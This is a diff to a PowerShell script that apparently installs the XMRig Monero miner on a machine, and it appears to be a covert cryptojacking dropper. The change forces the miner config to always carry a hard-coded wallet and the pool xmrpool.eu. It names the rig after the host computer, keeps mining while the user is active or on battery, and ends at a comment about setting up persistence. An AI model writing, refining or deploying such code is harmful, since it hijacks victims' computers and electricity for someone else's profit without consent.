@@ -247,15 +247,9 @@ if (-not (Test-Path "$installDir\xmrig.exe")) {
         try {
             [System.IO.Compression.ZipFile]::ExtractToDirectory($xmrigZip, "$env:TEMP\xmrig-extract")
             
-            # Find the xmrig.exe in the extracted files and copy to install dir
+            # Copy the xmrig.exe to install dir (skip config.json as we generate our own)
             $xmrigExe = Get-ChildItem -Path "$env:TEMP\xmrig-extract" -Recurse -Filter "xmrig.exe" | Select-Object -First 1
             Copy-Item -Path $xmrigExe.FullName -Destination "$installDir\xmrig.exe" -Force
-            
-            # Copy the config file if it exists
-            $configFile = Get-ChildItem -Path "$env:TEMP\xmrig-extract" -Recurse -Filter "config.json" | Select-Object -First 1
-            if ($configFile) {
-                Copy-Item -Path $configFile.FullName -Destination "$installDir\config.json" -Force
-            }
         } catch {
             # Manual extraction fallback
             $shell = New-Object -ComObject Shell.Application
@@ -278,22 +272,9 @@ if (-not (Test-Path "$installDir\xmrig.exe")) {
     }
 }
 
-# Create the config file if it doesn't exist
-if (-not (Test-Path "$installDir\config.json")) {
-    # Calculate optimal thread count based on system specs
-    $threadCount = $specs.Threads
-    if ($specs.IsVirtual) {
-        $threadCount = [Math]::Max(1, $threadCount - 1)
-    }
-    
-    # Disable hardware AES if not supported
-    $hwAes = "true"
-    if (-not $specs.HasAES) {
-        $hwAes = "false"
-    }
-    
-    # Generate optimal config
-    $configContent = @"
+# Create or update the config file
+# Always ensure our wallet and settings are present
+$configContent = @"
 {
     "autosave": true,
     "cpu": {
@@ -315,32 +296,18 @@ if (-not (Test-Path "$installDir\config.json")) {
     "cuda": {
         "enabled": false
     },
-    "donate-level": 0,
-    "donate-over-proxy": 0,
-    "log-file": "$installDir\\xmrig.log",
+    "donate-level": 1,
+    "donate-over-proxy": 1,
+    "log-file": "$($installDir.Replace('\','\\'))\\xmrig.log",
     "pools": [
         {
             "algo": null,
-            "coin": null,
+            "coin": "XMR",
             "url": "xmrpool.eu:5555",
             "user": "4AHxVmrWgk2SyHFLR9LoGxhW14fxe8cDQbKFfoyhWtavJVdUVREUP33jBkQtqSPfw4HZLAgEiA9SkbwXaXCqRMj44VuQ4n9",
             "pass": "x",
-            "rig-id": "$($env:COMPUTERNAME)-$([Guid]::NewGuid().ToString().Substring(0,6))",
-            "nicehash": true,
-            "keepalive": true,
-            "enabled": true,
-            "tls": false,
-            "tls-fingerprint": null,
-            "daemon": false
-        },
-        {
-            "algo": null,
-            "coin": null,
-            "url": "xmrpool.eu:3333",
-            "user": "4AHxVmrWgk2SyHFLR9LoGxhW14fxe8cDQbKFfoyhWtavJVdUVREUP33jBkQtqSPfw4HZLAgEiA9SkbwXaXCqRMj44VuQ4n9",
-            "pass": "x",
-            "rig-id": "$($env:COMPUTERNAME)-$([Guid]::NewGuid().ToString().Substring(0,6))",
-            "nicehash": true,
+            "rig-id": "$($env:COMPUTERNAME)",
+            "nicehash": false,
             "keepalive": true,
             "enabled": true,
             "tls": false,
@@ -369,8 +336,8 @@ if (-not (Test-Path "$installDir\config.json")) {
     "pause-on-battery": false,
     "pause-on-active": false
 }
-"@ | Set-Content -Path "$installDir\config.json" -Force
-}
+"@ 
+Set-Content -Path "$installDir\config.json" -Value $configContent -Force -Encoding UTF8
 
 # Setup persistence mechanisms
 
